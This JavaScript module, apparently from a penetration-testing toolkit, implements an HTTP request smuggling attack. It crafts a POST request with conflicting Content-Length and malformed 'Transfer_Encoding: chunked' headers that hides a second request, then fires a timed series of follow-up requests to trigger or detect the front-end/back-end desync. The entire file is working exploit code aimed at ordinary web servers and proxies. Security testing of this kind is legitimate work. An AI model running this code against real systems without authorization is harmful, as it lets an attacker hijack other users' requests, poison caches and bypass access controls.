// NOTE: this is a basic strategy test
// TODO: implement other strategies

const { sleep } = require('@pown/async/lib/sleep')

const smuggle = (options) => {
    const {
        port,

        tls = false,

        host,
        path,
        headers,

        smuggledMethod = 'GET',
        smuggledHost,
        smuggledPath = '/',
        smuggledHeaders,

        count = 15,

        delay = 0.05,

        scheduler
    } = options

    const smuggledRequest = `${smuggledMethod} ${smuggledPath} HTTP/1.1\r\nHost: ${smuggledHost}\r\n${smuggledHeaders}`

    const firstRequest = `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n${headers ? headers + '\r\n' : ''}Content-type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: ${3 + smuggledRequest.length}\r\nTransfer_Encoding: chunked\r\n\r\n0\r\n${smuggledRequest}`

    const subsequentRequest = `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n${headers ? headers + '\r\n' : ''}Content-type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: 3\r\n\r\n0\r\n`

    return scheduler
        .connect({ type: 'base', tls, host, port, data: firstRequest })
        .then(async(response) => {
            return [
                response,

                ...await Promise.all(Array.from(Array(count).keys()).map(async(index) => {
                    const time = index * delay

                    if (time) {
                        await sleep(index * delay)
                    }

                    return await scheduler.connect({ type: 'test', tls, host, port, data: subsequentRequest })
                }))
            ]
        })
}

module.exports = { smuggle }
